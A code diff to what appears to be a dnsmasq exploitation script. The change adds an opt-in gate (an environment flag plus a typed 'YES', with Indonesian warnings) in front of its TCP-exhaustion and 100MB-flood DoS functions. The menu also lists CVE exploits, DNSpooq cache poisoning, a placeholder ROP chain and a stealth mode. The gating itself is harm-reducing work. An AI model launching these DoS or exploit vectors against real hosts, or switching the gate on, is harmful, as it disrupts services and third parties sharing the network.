@@ -626,6 +626,8 @@ def exploit_cve_2017_13704(target_ip):
         print(f"[-] EDNS0 Error: {e}")
 
 def exploit_tcp_dos(target_ip):
+    if not require_dos_consent(target_ip, "TCP Exhaustion (2000 sockets)"):
+        return
     print(f"\n[*] [TCP DOS] Architectural Exhaustion...")
     try:
         soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
@@ -661,7 +663,35 @@ def exploit_tcp_dos(target_ip):
         try: s.close()
         except: pass
 
+# --- RESTRICTED: resource-exhaustion (DoS) vectors ---------------------------------
+# These are DISABLED by default because non-targeted resource exhaustion is the
+# least defensible part of this tool: it has no clean "authorized test" story and
+# can disrupt third parties sharing the network. They only run when this flag is
+# explicitly enabled AND the operator types a confirmation at runtime.
+#   Enable deliberately:  MASQ_ALLOW_DOS=1 python3 masq_overflow.py <TARGET>
+ALLOW_DOS = os.environ.get("MASQ_ALLOW_DOS", "") == "1"
+
+def require_dos_consent(target_ip, what):
+    """Two-key gate for DoS vectors: env flag + interactive confirmation."""
+    if not ALLOW_DOS:
+        print(f"\n[!] BLOCKED: '{what}' adalah vektor resource-exhaustion (DoS).")
+        print("[!] Dinonaktifkan default. Aktifkan sadar dengan:")
+        print("[!]   MASQ_ALLOW_DOS=1 python3 masq_overflow.py <TARGET>")
+        print("[!] Hanya jalankan terhadap host yang kamu miliki/berwenang, dan")
+        print("[!] pastikan tidak ada pihak lain yang bergantung pada layanan itu.")
+        return False
+    print(f"\n[!] {what} = resource exhaustion (DoS).")
+    print(f"[!] Target: {target_ip}")
+    ans = input("[?] Saya berwenang & target milik saya / diizinkan. Lanjut? (type YES): ").strip()
+    if ans != "YES":
+        print("[-] Dibatalkan.")
+        return False
+    return True
+
+
 def exploit_heavy_buffer(target_ip):
+    if not require_dos_consent(target_ip, "Heavy DOS (100MB flood)"):
+        return
     print(f"\n[*] [HEAVY DOS] 100MB Stream...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -882,8 +912,8 @@ def main():
         print("4. CVE-2015-3294  (TCP Malformed Packet + Info Leak)")
         print("5. CVE-2017-13704 (Oversized EDNS0)")
         print("6. DNSpooq        (Cache Poisoning - TXID Brute)")
-        print("7. TCP Exhaustion (Architectural DoS)")
-        print("8. Heavy DOS      (100MB Buffer Flood)")
+        print("7. TCP Exhaustion (DoS)          [BLOCKED by default]")
+        print("8. Heavy DOS      (100MB Flood)  [BLOCKED by default]")
         print("-" * 30)
         print("9. [UNVERIFIED] ROP Chain Construction (PLACEHOLDER offsets — no RCE proof)")
         print("S. Toggle Stealth Mode")
